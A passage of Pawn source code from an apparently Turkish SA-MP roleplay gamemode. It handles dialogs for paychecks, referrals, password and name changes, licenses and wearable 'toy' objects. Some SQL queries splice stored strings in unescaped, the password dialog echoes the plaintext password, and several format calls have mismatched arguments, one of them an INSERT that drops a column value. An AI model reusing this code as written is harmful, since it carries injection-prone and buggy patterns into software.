            format(string, sizeof(string), "  Yeni Bakiye: $%d |  Ödenen Kira: $%d", PlayerInfo[playerid][pBank], (PlayerInfo[playerid][pRenting] != INVALID_HOUSE_ID) ? (HouseInfo[PlayerInfo[playerid][pRenting]][hRentFee]) : (0));
            SendClientMessage(playerid, COLOR_GRAD5, string);

            GameTextForPlayer(playerid, "~w~Maas Alindi", 5000, 1);

            PlayerInfo[playerid][pPayReady] = 0;
            PlayerInfo[playerid][pPayCheck] = 0;

            #if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pRespect] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "* Ýki kat XP etkinliði olduðu için 2 saygý puaný kazandýn.");
				}
				else
				{
	    			SendClientMessage(playerid, COLOR_YELLOW, "* Ýki kat XP etkinliði olmadýðý için yalnýzca 1 saygý puaný kazandýn.");
					PlayerInfo[playerid][pRespect]++;
				}
            #else
            	PlayerInfo[playerid][pRespect]++;
            #endif

            PlayerInfo[playerid][pConnectTime]++;
            SignedPaycheck[playerid] = 1;
            MissedPaychecks[playerid] = 0;

            // Referrals
            if(PlayerInfo[playerid][pConnectTime] == 8 && (strlen(PlayerInfo[playerid][pReferredBy]) > 3 && strlen(PlayerInfo[playerid][pReferredBy]) < 20))
            {
            	new giveplayerid = ReturnUser(PlayerInfo[playerid][pReferredBy]);
    	        if(IsPlayerConnected(giveplayerid))
				{
    				PlayerInfo[giveplayerid][pRefTokens]++;
				    format(string, sizeof(string), "Senin tarafýndan önerilen arkadaþýn 8 saatlik oyun oynama saatine eriþti ve bu yüzden 1 öneri jetonu kazandýn.", GetPlayerNameEx(playerid));
				    SendClientMessage(giveplayerid, COLOR_YELLOW, string);

				    format(string, sizeof(string), "8 oyun oynama saatine eriþtin ve %s tarafýndan önerildiðin için, ona 1 öneri jetonu kazandýrdýn.", PlayerInfo[playerid][pReferredBy]);
				    SendClientMessage(playerid, COLOR_YELLOW, string);
				}
				else  {
				    /*OnPlayerOfflineLogin(PlayerInfo[playerid][pReferredBy]);
				    PlayerInfo[MAX_PLAYERS][pRefTokensOffline]++;
				    OnPlayerOfflineSave(PlayerInfo[playerid][pReferredBy]);*/

				    new
				        szQuery[128];

					format(szQuery, sizeof(szQuery), "SELECT RefTokensOffline FROM players WHERE Username = '%s'", PlayerInfo[playerid][pReferredBy]);
					mysql_query(szQuery, THREAD_GIVE_REF_TOKENS, playerid, g_MySQLConnections[0]);
				}
            }
        }
        else
		{
            SendClientMessage(playerid, COLOR_WHITE, "Yanlýþ kod");
        }
    }
	else if(dialogid == 2398)
	{
	    if(strlen(inputtext) >= 64)
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "Þifrende maksimum 64 karakter kullanabilirsin.");
	    }
	    else
	    {
	        if(strlen(inputtext) >= 1)
	        {
	            if(!response)
	            {
	                SendClientMessage(playerid, COLOR_WHITE, "Þifre deðiþtirmekten vazgeçtin.");
	            }
	            else
	            {
					new passbuffer[129];
					WP_Hash(passbuffer, sizeof(passbuffer), inputtext);

	             	format(PlayerInfo[playerid][pKey], 129, "%s", passbuffer);
		            format(string, sizeof(string), "Karakterinin þifresini '%s' olarak deðiþtirdin.", inputtext);

		            SendClientMessage(playerid, COLOR_YELLOW, string);
		            OnPlayerStatsUpdate(playerid);

					format(string, sizeof(string), "%s (IP: %s) karakterinin þifresini deðiþtirdi.", GetPlayerNameEx(playerid), PlayerInfo[playerid][pIP]);
					Log("logs/password.log", string);
	            }
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_WHITE, "Þifren 1 karakterden fazla olmak zorunda.");
	        }
	    }
	}
	else if(dialogid == DIALOG_NAMECHANGE)
	{
	    if(!response || strlen(inputtext) == 0) return SendClientMessage(playerid, COLOR_WHITE, "Ýsmini deðiþtirmekten vazgeçtin.");
	    if(strlen(inputtext) > 20)
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "Ýsmin 20 karakterden fazla karakter içeremez.");
	    }
	    else
	    {
	        if(strlen(inputtext) >= 1)
	        {
	            if(!response)
	            {
	                SendClientMessage(playerid, COLOR_WHITE, "Ýsmini deðiþtirmekten vazgeçtin.");
	            }
	            else
	            {
		            for(new i = 0; i < strlen(inputtext); i++)
					{
					    if(inputtext[i] == ' ') return SendClientMessage(playerid, COLOR_GRAD2, "Ýsminizde boþluk yerine '_' kullanýn.");
					}
					if(strfind(inputtext, "_", true) == -1)
					{
						SendClientMessage(playerid, COLOR_WHITE, "Ýsim deðiþtirme isteði reddedildi. Lütfen doðru formatta isim seçin: Ýsim_Soyisim.");
						return 1;
					}
					new namechangecost;
					namechangecost = (PlayerInfo[playerid][pLevel]) * 1500;
					SetPVarInt(playerid, "requestpath", 2);
					if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pFaction] == 4)
					{
	    				new String[128];
						SetPVarInt(playerid, "RequestingNameChange", 1);
						SetPVarString(playerid, "NewNameRequest", inputtext);
						new playername[MAX_PLAYER_NAME];
						GetPlayerName(playerid, playername, sizeof(playername));
		            	format(String, sizeof(String), "Ýsmini herhangi bir ücret ödemeden %s'den %s olarak deðiþtirmek için istek yolladýn.(Hitman yada FBI). Admin onaylayana kadar bekle.", playername, inputtext, namechangecost);
		            	SendClientMessage(playerid, COLOR_YELLOW, String);
		            	format(String, sizeof(String), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d)  ücretsiz olarak ismini %s yapmak istiyor. /ikabul %d (/kabul), yada /ired %d (red).", playername, playerid, inputtext, playerid, playerid);
		            	ABroadCast(COLOR_YELLOW, String, 1);
		            	return 1;
					}
					if(GetPlayerCash(playerid) >= namechangecost)
					{
					    new String[128];
						SetPVarInt(playerid, "RequestingNameChange", 1);
						SetPVarString(playerid, "NewNameRequest", inputtext);
						SetPVarInt(playerid, "NameChangeCost", namechangecost);
						new playername[MAX_PLAYER_NAME];
						GetPlayerName(playerid, playername, sizeof(playername));
		            	format(String, sizeof(String), "$%d ödeyerek ismini %s'dan % yapmak için istek yolladýn. Admin onayý bekliyorsun.", playername, inputtext, namechangecost);
		            	SendClientMessage(playerid, COLOR_YELLOW, String);
		            	format(String, sizeof(String), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d) ismini %s yapmak için $%d ödeyecek %s 'dan % yapmak için istek yolladý. /ikabul %d (kabul).", playername, playerid, inputtext, namechangecost, playerid);
		            	ABroadCast(COLOR_YELLOW, String, 1);
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GRAD2, "Ýsim deðiþtirmek için yeterli paran yok.");
					}
	            }
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_WHITE, "Ýsmin 1 karakterden fazla olmalý.");
	        }
	    }
	}
	else if(dialogid == DIALOG_NAMECHANGE2)
	{
	    if(!response || strlen(inputtext) == 0) return Kick(playerid);
	    if(strlen(inputtext) >= 20)
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "Ýsmin 20 karakterden fazla karakter içeremez.");
	        ShowPlayerDialogEx(playerid, DIALOG_NAMECHANGE2, DIALOG_STYLE_INPUT, "Ücretsiz isim deðiþtirme","Burasý bir RP serveridir. RP serverlerinde isminizi þu formatta yapmalýsýnýz: Ýsim_Soyisim.\nÖrneðin: John_Smith yada Mert_Demir\n\nBir admin sana þuanki isminin formatýný düzeltmen için ücretsiz isim deðiþtirme teklif etti. Lütfen istediðin ismi aþaðýya gir.\n\nUyarý: Eðer iptale basarsanýz, sunucudan otomatik olarak kickleneceksiniz.", "Deðiþtir", "Iptal");
	    }
	    else
	    {
	        if(strlen(inputtext) >= 1)
	        {
	            if(!response)
	            {
				    ShowPlayerDialogEx(playerid, DIALOG_NAMECHANGE2, DIALOG_STYLE_INPUT, "Ücretsiz isim deðiþtirme","Burasý bir RP serveridir. RP serverlerinde isminizi þu formatta yapmalýsýnýz: Ýsim_Soyisim.\nÖrneðin: John_Smith yada Mert_Demir\n\nBir admin sana þuanki isminin formatýný düzeltmen için ücretsiz isim deðiþtirme teklif etti. Lütfen istediðin ismi aþaðýya gir.\n\nUyarý: Eðer iptale basarsanýz, sunucudan otomatik olarak kickleneceksiniz.", "Deðiþtir", "Iptal");
				}
	            else
	            {
           			for(new i = 0; i < strlen(inputtext); i++)
					{
    					if(inputtext[i] == ' ')
    					{
							SendClientMessage(playerid, COLOR_WHITE, "Ýsminizde boþluk yerine '_' kullanýn.");
							ShowPlayerDialogEx(playerid, DIALOG_NAMECHANGE2, DIALOG_STYLE_INPUT, "Ücretsiz isim deðiþtirme","Burasý bir RP serveridir. RP serverlerinde isminizi þu formatta yapmalýsýnýz: Ýsim_Soyisim.\nÖrneðin: John_Smith yada Mert_Demir\n\nBir admin sana þuanki isminin formatýný düzeltmen için ücretsiz isim deðiþtirme teklif etti. Lütfen istediðin ismi aþaðýya gir.\n\nUyarý: Eðer iptale basarsanýz, sunucudan otomatik olarak kickleneceksiniz.", "Deðiþtir", "Iptal");
							return 1;
						}
					}
					if(strfind(inputtext, "_", true) == -1)
					{
						SendClientMessage(playerid, COLOR_WHITE, "Ýsim deðiþtirme isteði reddedildi. Lütfen doðru formatta isim seçin: Ýsim_Soyisim.");
						ShowPlayerDialogEx(playerid, DIALOG_NAMECHANGE2, DIALOG_STYLE_INPUT, "Ücretsiz isim deðiþtirme","Burasý bir RP serveridir. RP serverlerinde isminizi þu formatta yapmalýsýnýz: Ýsim_Soyisim.\nÖrneðin: John_Smith yada Mert_Demir\n\nBir admin sana þuanki isminin formatýný düzeltmen için ücretsiz isim deðiþtirme teklif etti. Lütfen istediðin ismi aþaðýya gir.\n\nUyarý: Eðer iptale basarsanýz, sunucudan otomatik olarak kickleneceksiniz.", "Deðiþtir", "Iptal");
						return 1;
					}
     				else
					{
						new String[128];
						SetPVarInt(playerid, "RequestingNameChange", 1);
						SetPVarInt(playerid, "NameChangeCost", 0);
						SetPVarString(playerid, "NewNameRequest", inputtext);
						new playername[MAX_PLAYER_NAME];
						GetPlayerName(playerid, playername, sizeof(playername));
    					format(String, sizeof(String), "Ýsmini %s'den % olarak deðiþtirmek için istek yolladýn. Admin onayý bekliyorsun.", playername, inputtext);
       					SendClientMessage(playerid, COLOR_YELLOW, String);
          				format(String, sizeof(String), "{AA3333}AdminUyarýsý{FFFF00}:%s (ID %d) adlý oyuncu ismini %s yapmak istiyor. (NON-RP Ýsim & Ücretsiz) - /ikabul %d (kabul), yada /ired %d (red).", playername, playerid, inputtext, playerid, playerid);
            			ABroadCast(COLOR_YELLOW, String, 1);
            			return 1;
            		}
				}
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_WHITE, "Ýsmin 1 karakterden fazla olmalý.");
	            ShowPlayerDialogEx(playerid, DIALOG_NAMECHANGE2, DIALOG_STYLE_INPUT, "Ücretsiz isim deðiþtirme","Burasý bir RP serveridir. RP serverlerinde isminizi þu formatta yapmalýsýnýz: Ýsim_Soyisim.\nÖrneðin: John_Smith yada Mert_Demir\n\nBir admin sana þuanki isminin formatýný düzeltmen için ücretsiz isim deðiþtirme teklif etti. Lütfen istediðin ismi aþaðýya gir.\n\nUyarý: Eðer iptale basarsanýz, sunucudan otomatik olarak kickleneceksiniz.", "Deðiþtir", "Iptal");
	        }
	    }
	}
	if(dialogid == DIALOG_LICENSE_BUY && response)
	{
		switch (listitem)
		{
			case 0:
			{
			    if(PlayerInfo[playerid][pCarLic] == 0)
			    {
			        if(GetPlayerCash(playerid) < 500)
			        {
			            SendClientMessage(playerid, COLOR_GREY, "Sürücü belgesini karþýlayacak paran yok.");
			            return 1;
			        }
					GivePlayerCash(playerid,-500);
					PlayerInfo[playerid][pCarLic] = 1;
					SendClientMessage(playerid, COLOR_GREY, "Baþarýlý bir þekilde sürücü belgesi aldýn.");
				}
				else SendClientMessage(playerid, COLOR_GREY, "Zaten sürücü belgen var.");
			}
			case 1:
			{
			    if(PlayerInfo[playerid][pBoatLic] == 0)
			    {
			        if(GetPlayerCash(playerid) < 500)
			        {
			            SendClientMessage(playerid, COLOR_GREY, "Denizci belgesini karþýlayacak paran yok.");
			            return 1;
			        }
					GivePlayerCash(playerid,-500);
					PlayerInfo[playerid][pBoatLic] = 1;
					SendClientMessage(playerid, COLOR_GREY, "Baþarýlý bir þekilde denizci belgesi aldýn.");
				}
				else SendClientMessage(playerid, COLOR_GREY, "Zaten denizci belgen var.");
			}
			case 2:
			{
			    if(PlayerInfo[playerid][pFlyLic] == 0)
			    {
			    	if(PlayerInfo[playerid][pLevel] >=2) // FOR LATER SETTING POSSIBLY
			    	{
			    	    if(GetPlayerCash(playerid) < 2500)
			        	{
			            	SendClientMessage(playerid, COLOR_GREY, "Pilot belgesini karþýlayacak paran yok.");
			            	return 1;
			        	}
						GivePlayerCash(playerid,-2500);
						PlayerInfo[playerid][pFlyLic] = 1;
      					SendClientMessage(playerid, COLOR_GREY, "Baþarýlý bir þekilde pilot belgesi satýn aldýn. Artýk uçabilirsin.");
					}
					else SendClientMessage(playerid, COLOR_GREY, "Pilot belgesine sahip olmak için minimum 2 level olman gerek.");
				}
                else SendClientMessage(playerid, COLOR_GREY, "Zaten pilot belgen var.");
			}
		}
	}
 	if(dialogid == FAMILYSKINDIALOG)
    {
        if(response)
	    {
   			if(listitem == 0)
      		{
        		SetFamilySkin(playerid, 0);
      		}
   			if(listitem == 1)
      		{
                SetFamilySkin(playerid, 1);
      		}
   			if(listitem == 2)
      		{
                SetFamilySkin(playerid, 2);
      		}
   			if(listitem == 3)
      		{
                SetFamilySkin(playerid, 3);
      		}
			if(listitem == 4)
      		{
                SetFamilySkin(playerid, 4);
      		}
			if(listitem == 5)
      		{
                SetFamilySkin(playerid, 5);
      		}
			if(listitem == 6)
      		{
                SetFamilySkin(playerid, 6);
      		}
			if(listitem == 7)
      		{
                SetFamilySkin(playerid, 7);
      		}
	    }
	 }
	if((dialogid == BUYTOYS) && response)
	{
	    new stringg[856];
		for(new x;x<MAX_PLAYERTOYS;x++)
		{
  			new name[24];
	    	format(name, sizeof(name), "Yok");

			for(new i;i<sizeof(HoldingObjectsAll);i++)
   			{
				if(HoldingObjectsAll[i][holdingmodelid] == PlayerToyInfo[playerid][x][ptModelID])
    			{
   					format(name, sizeof(name), "%s", HoldingObjectsAll[i][holdingmodelname]);
				}
			}

			format(stringg, sizeof(stringg), "%s(%d) %s (Kemik: %s)\n", stringg, x, name, HoldingBones[PlayerToyInfo[playerid][x][ptBone]]);
		}
		ShowPlayerDialogEx(playerid, BUYTOYS2, DIALOG_STYLE_LIST, "Select a Slot", stringg, "Seç", "Iptal");
	}
	if((dialogid == BUYTOYS2) && response)
	{
	    if(listitem == 5 && PlayerInfo[playerid][pDonator] < 1) return SendClientMessage(playerid, COLOR_WHITE, "* Bu slotu kullanabilmek için Yakut VIP olman gerek.");
	    if(listitem == 6 && PlayerInfo[playerid][pDonator] < 2) return SendClientMessage(playerid, COLOR_WHITE, "* Bu slotu kullanabilmek için Safir VIP olman gerek.");
        if(listitem == 7 && PlayerInfo[playerid][pDonator] < 3) return SendClientMessage(playerid, COLOR_WHITE, "* Bu slotu kullanabilmek için Elmas VIP olman gerek.");

	    if(PlayerToyInfo[playerid][listitem][ptModelID] != 0) return SendClientMessage(playerid, COLOR_YELLOW, "* O slotta baþka bir eþyan var. Silmek için /oyuncaklar yaz.");

		slotselection[playerid] = listitem;

		new stringg[4000];
		for(new x;x<sizeof(HoldingObjects);x++)
		{
		    format(stringg, sizeof(stringg), "%s%s ($%d)\n", stringg, HoldingObjects[x][holdingmodelname], HoldingObjects[x][holdingprice]);
		}
		ShowPlayerDialogEx(playerid, BUYTOYS3, DIALOG_STYLE_LIST, "* Ýtem Seç", stringg, "Satýn Al", "Iptal");
	}
	if((dialogid == BUYTOYS3) && response)
	{
		if(GetPlayerCash(playerid) < HoldingObjects[listitem][holdingprice])
		{
		    SendClientMessage(playerid, COLOR_WHITE, "* Bunu karþýlayamazsýn!");
		}
		else
		{
			GivePlayerCash(playerid, -HoldingObjects[listitem][holdingprice]);
		    PlayerToyInfo[playerid][slotselection[playerid]][ptModelID] = HoldingObjects[listitem][holdingmodelid];

		    new modelid = PlayerToyInfo[playerid][slotselection[playerid]][ptModelID];
		    if((modelid >= 19006 && modelid <= 19035) || (modelid >= 19138 && modelid <= 19140))
		    {
		        PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.9;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.35;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 90.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 90.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
		    }
		    else if(modelid >= 18891 && modelid <= 18910)
		    {
		    	PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.15;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 90.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 180.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 90.0;
			}
			else if(modelid >= 18926 && modelid <= 18935)
			{
				PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.1;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
			}
			else if(modelid >= 18911 && modelid <= 18920)
			{
			    PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.1;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.035;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 90.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 180.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 90.0;
			}
			else if(modelid == 19078 || modelid == 19078)
			{
			    PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 16;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 180.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 180.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
			}
			else if((modelid >= 18641 && modelid <= 18644) || (modelid >= 19080 && modelid <= 19084) || modelid == 18890)
			{
			    PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 6;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
			}
		    else
		    {
				PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
			}
			PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX] = 1.0;
			PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY] = 1.0;
			PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ] = 1.0;

			new
			    szQuery[460];
			format(szQuery, sizeof(szQuery),"INSERT INTO toys (Owner, ModelID, Bone, PosX, PosY, PosZ, RotX, RotY, RotZ, ScaX, ScaY, ScaZ) VALUES(%d, %d, %d, '%f', '%f', '%f', '%f', '%f', '%f', '%f', '%f', '%f')",
			PlayerInfo[playerid][pID], PlayerToyInfo[playerid][slotselection[playerid]][ptModelID], PlayerToyInfo[playerid][slotselection[playerid]][ptPosX], PlayerToyInfo[playerid][slotselection[playerid]][ptPosY], PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ],
			PlayerToyInfo[playerid][slotselection[playerid]][ptRotX], PlayerToyInfo[playerid][slotselection[playerid]][ptRotY], PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ], PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX], PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY],
			PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ]);
			mysql_query(szQuery);
			PlayerToyInfo[playerid][slotselection[playerid]][ptRealID] = mysql_insert_id();

			format(string, sizeof(string), "* $%d ödeyerek %s satýn aldýn (Slot: %d)", HoldingObjects[listitem][holdingmodelname], HoldingObjects[listitem][holdingprice], slotselection[playerid]);
		    SendClientMessage(playerid, COLOR_RED, string);
		    SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Oyuncaðýný giymek/ayarlamak için /oyuncaklar yaz.");
		}
	}
	if((dialogid == TOYS) && response)
	{
		if(listitem == 0)
		{
		    new stringg[856];
			for(new x;x<MAX_PLAYERTOYS;x++)
			{
			    new name[64];
			    format(name, sizeof(name), "Yok");

			    for(new i;i<sizeof(HoldingObjectsAll);i++)
			    {
       				if(HoldingObjectsAll[i][holdingmodelid] == PlayerToyInfo[playerid][x][ptModelID])
			        {
           				format(name, sizeof(name), "%s", HoldingObjectsAll[i][holdingmodelname]);
					}
				}

				format(stringg, sizeof(stringg), "%s(%d) %s (Kemik: %s)\n", stringg, x, name, HoldingBones[PlayerToyInfo[playerid][x][ptBone]]);
			}
   			ShowPlayerDialogEx(playerid, WEARTOY, DIALOG_STYLE_LIST, "Oyuncak Seç", stringg, "Seç", "Iptal");
	    }
		else if(listitem == 1)
		{
		    new stringg[856];
			for(new x;x<MAX_PLAYERTOYS;x++)
			{
			    new name[24];
			    format(name, sizeof(name), "Yok");

			    for(new i;i<sizeof(HoldingObjectsAll);i++)
			    {
       				if(HoldingObjectsAll[i][holdingmodelid] == PlayerToyInfo[playerid][x][ptModelID])
			        {
           				format(name, sizeof(name), "%s", HoldingObjectsAll[i][holdingmodelname]);
					}
				}

				format(stringg, sizeof(stringg), "%s(%d) %s (Kemik: %s)\n", stringg, x, name, HoldingBones[PlayerToyInfo[playerid][x][ptBone]]);
			}
   			ShowPlayerDialogEx(playerid, EDITTOYS, DIALOG_STYLE_LIST, "Oyuncak Seç", stringg, "Seç", "Iptal");
   		}
		else if(listitem == 2)
		{
		    new stringg[856];
			for(new x;x<MAX_PLAYERTOYS;x++)
			{
			    new name[24];
			    format(name, sizeof(name), "Yok");

			    for(new i;i<sizeof(HoldingObjectsAll);i++)
			    {
       				if(HoldingObjectsAll[i][holdingmodelid] == PlayerToyInfo[playerid][x][ptModelID])
			        {
           				format(name, sizeof(name), "%s", HoldingObjectsAll[i][holdingmodelname]);
					}
				}

				format(stringg, sizeof(stringg), "%s(%d) %s (Kemik: %s)\n", stringg, x, name, HoldingBones[PlayerToyInfo[playerid][x][ptBone]]);
			}
   			ShowPlayerDialogEx(playerid, DELETETOY, DIALOG_STYLE_LIST, "Oyuncak Seç", stringg, "Sil", "Iptal");
		}
	}

	if((dialogid == EDITTOYS) && response) {
	    if(PlayerToyInfo[playerid][listitem][ptModelID] == 0) {
	        ShowPlayerDialogEx(playerid, 0, DIALOG_STYLE_MSGBOX, "Oyuncak Menüsü: Ayarla", "Oooops! O slotta hiçbirþeyin yok.", "Tamam", "");
		}
		else {
		    slotselection[playerid] = listitem;
		    ShowEditMenu(playerid);
		}
	}
	if((dialogid == EDITTOYS2)) {
	    if(response) switch(listitem) {
		    case 0: ShowPlayerDialogEx(playerid, EDITTOYSBONE, DIALOG_STYLE_LIST, "Kemik Seçin", "Omurga\nKafa\nSol Üstkol\nSað Üstkol\nSol El\nSað El\nSol Uyluk\nSað Uyluk\nSol Ayak\nSað Ayak\nSað Baldýr\nSol Baldýr\nSol Önkol\nSað Önkol\nSol Köprücük\nSað Köprücük\nBoyun\nÇene", "Seç", "Iptal");
		    case 1: EditAttachedObject(playerid, slotselection[playerid]);
		}
		else
		{
		    new stringg[856];
			for(new x;x<MAX_PLAYERTOYS;x++)
			{
			    new name[24];
			    format(name, sizeof(name), "Yok");

			    for(new i;i<sizeof(HoldingObjectsAll);i++)
			    {
       				if(HoldingObjectsAll[i][holdingmodelid] == PlayerToyInfo[playerid][x][ptModelID])
			        {
           				format(name, sizeof(name), "%s", HoldingObjectsAll[i][holdingmodelname]);
					}
				}

				format(stringg, sizeof(stringg), "%s(%d) %s (Kemik: %s)\n", stringg, x, name, HoldingBones[PlayerToyInfo[playerid][x][ptBone]]);
			}
   			ShowPlayerDialogEx(playerid, EDITTOYS, DIALOG_STYLE_LIST, "Oyuncak Seç", stringg, "Seç", "Iptal");
		}
	}
	/* if(dialogid == EDITTOYSSX)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
	        if(offset < 0.1) offset = 0.1;
			else if(offset > 1.5) offset = 1.5;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX] = offset;
		}
		ShowEditMenu(playerid);
	}
	if(dialogid == EDITTOYSSY)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
	        if(offset < 0.1) offset = 0.1;
			else if(offset > 1.5) offset = 1.5;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY] = offset;
		}
		ShowEditMenu(playerid);
	}
	if(dialogid == EDITTOYSSZ)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
	        if(offset < 0.1) offset = 0.1;
			else if(offset > 1.5) offset = 1.5;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ] = offset;
		}
		ShowEditMenu(playerid);
	}
	if(dialogid == EDITTOYSPX)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
	        if(offset < -100) offset = 0;
			else if(offset > 100) offset = 100;
	        offset = offset/100;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = offset;
		}
		ShowEditMenu(playerid);
	}
	if(dialogid == EDITTOYSPY)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
     		if(offset < -100) offset = 0;
			else if(offset > 100) offset = 100;
	        offset = offset/100;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = offset;
		}
		ShowEditMenu(playerid);
	}
	if(dialogid == EDITTOYSPZ)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
	        if(offset < -100) offset = 0;
			else if(offset > 100) offset = 100;
			offset = offset/100;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = offset;
		}
		ShowEditMenu(playerid);
	}
	if(dialogid == EDITTOYSRX)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
	        if(offset < -100) offset = 0;
			else if(offset > 360) offset = 360;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = offset;
		}
		ShowEditMenu(playerid);
	}
	if(dialogid == EDITTOYSRY)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
	        if(offset < -100) offset = 0;
			else if(offset > 360) offset = 360;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = offset;
		}
		ShowEditMenu(playerid);
	}
	if(dialogid == EDITTOYSRZ)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
	        if(offset < -100) offset = 0;
			else if(offset > 360) offset = 360;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = offset;
		}
		ShowEditMenu(playerid);
	} */
	if(dialogid == EDITTOYSBONE)
	{
	    if(response)
	    {
			PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = listitem+1;
			if(PlayerToyInfo[playerid][slotselection[playerid]][ptBone] > 18 || PlayerToyInfo[playerid][slotselection[playerid]][ptBone] < 1) {
				PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 1;
			}
		}
	 	ShowEditMenu(playerid);
	}
	if((dialogid == WEARTOY) && response)
	{
	    if(PlayerToyInfo[playerid][listitem][ptModelID] == 0)
	    {
	        ShowPlayerDialogEx(playerid, 0, DIALOG_STYLE_MSGBOX, "Oyuncak Menüsü: Tak/Çýkar", "Oooops! O slotta takabileceðin birþey yok.", "Tamam", "");
		}
		else
		{
		    if(IsPlayerAttachedObjectSlotUsed(playerid, listitem))
			{
			    new name[24];
			    format(name, sizeof(name), "Yok");

				for(new i;i<sizeof(HoldingObjectsAll);i++)
	   			{
					if(HoldingObjectsAll[i][holdingmodelid] == PlayerToyInfo[playerid][listitem][ptModelID])
					{
						format(name, sizeof(name), "%s", HoldingObjectsAll[i][holdingmodelname]);
					}
				}
